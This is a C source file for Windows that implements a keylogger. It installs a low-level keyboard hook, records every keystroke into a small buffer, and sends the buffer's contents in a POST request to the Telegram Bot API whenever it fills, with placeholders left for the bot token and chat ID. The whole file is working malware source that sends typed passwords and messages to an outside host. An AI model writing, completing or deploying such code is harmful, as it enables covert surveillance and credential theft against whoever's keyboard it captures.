#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winhttp.h>
#pragma comment(lib, "winhttp.lib")

#define BUFFER_SIZE 20

HHOOK hHook = NULL;
char* keystrokes = NULL;
size_t keystrokesSize = 0;

int sendToTgBot(const char* message);

void appendToKeystrokes(char character) {
    if (keystrokesSize + 1 >= BUFFER_SIZE) {
        // Buffer is full, send it to the bot and reset
        printf("Buffer is full");
        sendToTgBot(keystrokes);
        keystrokesSize = 0;
        keystrokes[0] = '\0';
    }

    keystrokes[keystrokesSize++] = character;
    keystrokes[keystrokesSize] = '\0'; // Null-terminate the string
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;

        if (wParam == WM_KEYDOWN) {
            if (p->vkCode == VK_RETURN) {
                appendToKeystrokes('\n');
            }
            else {
                SHORT shiftState = GetAsyncKeyState(VK_SHIFT);
                CHAR character = 0;
                BYTE keyboardState[256];

                if (GetKeyboardState(keyboardState)) {
                    int result = ToAscii(p->vkCode, p->scanCode, keyboardState, (LPWORD)&character, 0);

                    if (result > 0) {
                        if (!(shiftState & 0x8000)) {
                            character = tolower(character);
                        }

                        appendToKeystrokes(character);
                    }
                }
                else {
                    fprintf(stderr, "GetKeyboardState failed\n");
                }
            }
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

DWORD WINAPI MyThreadFunction(LPVOID lpParam) {
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}

int sendToTgBot(const char* message) {
    const char* chatId = "{CHAT ID}"; // Change this to your chat ID
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    BOOL bResults = FALSE;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;
    DWORD dwStatusCode = 0;
    DWORD dwStatusSize = sizeof(dwStatusCode);

    hSession = WinHttpOpen(L"UserAgent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (hSession == NULL) {
        fprintf(stderr, "WinHttpOpen. Error: %d has occurred.\n", GetLastError());
        return 1;
    };
    printf("session success");

    hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (hConnect == NULL) {
        fprintf(stderr, "WinHttpConnect. Error: %d has occurred.\n", GetLastError());
        WinHttpCloseHandle(hSession);
        return 1;
    }
    printf("connection success");
    hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/bot{TELEGRAM API KEY}/sendMessage", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (hRequest == NULL) {
        fprintf(stderr, "WinHttpOpenRequest. Error: %d has occurred.\n", GetLastError());
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return 1;
    }

    // Construct the request body
    char requestBody[BUFFER_SIZE + 100];
    sprintf(requestBody, "chat_id=%s&text=%s", chatId, message);

    // Set the headers
    bResults = WinHttpSendRequest(hRequest, L"Content-Type: application/x-www-form-urlencoded\r\n", -1, requestBody, strlen(requestBody), strlen(requestBody), 0);
    if (!bResults) {
        fprintf(stderr, "WinHttpSendRequest. Error: %d has occurred.\n", GetLastError());
    }
    else {
        bResults = WinHttpReceiveResponse(hRequest, NULL);
        if (!bResults) {
            fprintf(stderr, "WinHttpReceiveResponse. Error: %d has occurred.\n", GetLastError());
        }
        else {
            WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &dwStatusCode, &dwStatusSize, NULL);
            if (dwStatusCode == 200) {
                printf("Successfully sent to Telegram bot :)\n");
            }
            else {
                printf("Failed to send to Telegram bot. HTTP Status Code: %d\n", dwStatusCode);
            }
        }
    }

    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    return bResults ? 0 : 1;
}

int main() {
    keystrokes = (char*)malloc(BUFFER_SIZE);
    if (keystrokes == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        return 1;
    }
    keystrokes[0] = '\0';

    CreateThread(NULL, 0, MyThreadFunction, NULL, 0, NULL);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    if (hHook != NULL) {
        UnhookWindowsHookEx(hHook);
    }
    if (keystrokes != NULL) {
        free(keystrokes);
    }

    return 0;
}
